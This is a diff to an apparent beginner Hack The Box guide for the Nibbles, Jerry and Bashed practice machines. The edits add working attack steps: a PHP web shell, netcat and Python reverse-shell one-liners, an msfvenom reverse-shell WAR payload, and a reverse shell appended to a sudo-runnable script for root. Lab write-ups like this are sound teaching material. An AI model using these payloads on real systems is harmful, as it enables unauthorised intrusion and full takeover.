@@ -18,12 +18,16 @@ AI tools can also help interpret scan results, explain vulnerabilities, or sugge
 When you get stuck, search Google for:
 
 ```
-htb <box_name> walkthrough
+htb <box-name> walkthrough
 ```
 
 There is no shame in reading walkthroughs during the learning process. The goal is understanding the workflow.
 
-## Machine 1: Nibbles (Linux) - [IppSec Nibbles Walkthrough](https://youtu.be/s_0GcRGv6Ds)
+## Machine 1: Nibbles (Linux)
+
+[IppSec Nibbles Walkthrough](https://youtu.be/s_0GcRGv6Ds)
+
+[0xdf Nibbles Writeup](https://0xdf.gitlab.io/2018/06/30/htb-nibbles.html)
 
 Nibbles is an excellent beginner machine. It demonstrates how a vulnerable web application can lead to initial access and eventually root privileges.
 
@@ -76,17 +80,40 @@ Now search ExploitDB.
 searchsploit nibbleblog
 ```
 
-One of the results will match the version of the application.
+One of the results will match the version of the application but is using Metasploit and we want to do this like real hackers.
 
 ### Step 4: Use the Exploit
 
-Copy the exploit locally.
+We can find a writeup of CVE-2015-6967 by searching Google for our nibbleblog version exploit.
 
-```
-searchsploit -m <exploit-id>
-```
+[CVE-2015-6967 NibbleBlog 4.0.3 Code Execution](https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html)
 
 Read the exploit and follow the instructions.
+
+Upload a php file (`cmd.php`) in the My image upload form:
+
+```
+<?php system($_REQUEST['cmd']); ?>
+```
+
+Visit the following url to confirm it works:
+
+```
+http://<target-ip>/nibbleblog/content/private/plugins/my_image/image.php?cmd=id
+```
+
+If that works, create a reverse shell php file to upload (`revshell.php`):
+
+```
+<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your-ip-address> 8082 >/tmp/f"); ?>
+```
+
+Upload that file and when visiting `image.php` you will catch the reverse shell with netcat:
+
+```
+nc -lnvp 8082
+```
+
 
 This should give you access to the system.
 
@@ -110,15 +137,25 @@ This shows which commands the current user can run as root.
 
 On Nibbles, you will discover a script that can be executed with sudo privileges.
 
+We can add another reverse shell to this file to gain a root shell:
+
+```
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your-ip-address> 8083 > /tmp/f" >> monitor.sh
+```
+
+Setup your netcat listner:
+
+```
+nc -lnvp 8083
+```
+
 Run the allowed command and use it to execute a shell.
 
-Example idea:
-
 ```
-sudo <allowed-command>
+sudo /home/nibbler/personal/stuff/monitor.sh
 ```
 
-If the script allows command execution or editing, you can use it to spawn a root shell.
+You should now have a root shell.
 
 ### Lesson
 
@@ -126,7 +163,11 @@ Web applications frequently contain vulnerabilities that lead to system access. 
 
 Privilege escalation often comes from misconfigured sudo permissions. Always check what the current user can run as root.
 
-## Machine 2: Jerry (Windows) - [IppSec Jerry Walkthrough](https://youtu.be/PJeBIey8gc4)
+## Machine 2: Jerry (Windows)
+
+[IppSec Jerry Walkthrough](https://youtu.be/PJeBIey8gc4)
+
+[0xdf Jerry Writeup](https://0xdf.gitlab.io/2018/11/17/htb-jerry.html)
 
 Jerry is a simple Windows machine that demonstrates how weak configuration can lead to compromise.
 
@@ -164,7 +205,7 @@ Open the site in your browser.
 http://<target-ip>:8080
 ```
 
-Look for administrative panels or login pages.
+Look for administrative panels or login pages. Try logging in with default credentials.
 
 Burp Suite can help you observe how the application communicates with the server.
 
@@ -184,9 +225,17 @@ Through research you will discover that Tomcat installations sometimes use defau
 
 ### Step 4: Gain Access
 
-After accessing the Tomcat manager interface, you can upload a web application that executes commands on the server.
+After accessing the Tomcat manager interface, you can upload a reverse shell war file that executes commands on the server:
 
-This results in a shell on the Windows machine.
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=<your-ip-address> LPORT=9002 -f war > rev_shell-9002.war
+```
+
+Navigating to this files location results in a shell on the Windows machine with your netcat listener:
+
+```
+nc -lnvp 9002
+```
 
 On Jerry, the shell you obtain is already running with high privileges.
 
@@ -210,7 +259,11 @@ Default credentials and exposed administrative panels are common attack paths.
 
 Some systems are misconfigured so badly that initial access already provides full control. Always check your current privileges immediately after gaining access.
 
-## Machine 3: Bashed (Linux) - [IppSec Bashed Walkthrough](https://youtu.be/2DqdPcbYcy8)
+## Machine 3: Bashed (Linux)
+
+[IppSec Bashed Walkthrough](https://youtu.be/2DqdPcbYcy8)
+
+[0xdf Bashed Writeup](https://0xdf.gitlab.io/2018/04/29/htb-bashed.html)
 
 Bashed demonstrates how discovering a web shell can lead to full system compromise.
 
@@ -244,13 +297,29 @@ Pay attention to files or scripts that may allow command execution.
 
 Burp Suite can help observe how requests are sent to the server.
 
-Eventually you will discover a web shell already present on the system.
+Another tool you can use to find directories is Gobuster:
+
+```
+gobuster -u http://<target-ip> -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+```
+
+Examine the `/dev` directory and eventually you will discover a web shell already present on the system.
 
 ### Step 3: Gain a Shell
 
 Use the web shell to execute commands on the system.
 
 Once you have command execution, upgrade your access to a more stable shell.
+
+```
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your-ip-address>",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+We can catch an upgraded shell with netcat:
+
+```
+nc -lnvp 1235
+```
 
 ### Step 4: Escalate Privileges
 
@@ -272,10 +341,8 @@ You will discover that the user can run commands as another user or root.
 
 Use this permission to spawn a higher-privileged shell.
 
-Example idea:
-
 ```
-sudo bash
+sudo -u scriptmanager /bin/bash
 ```
 
 or execute a command allowed by sudo to escalate privileges.
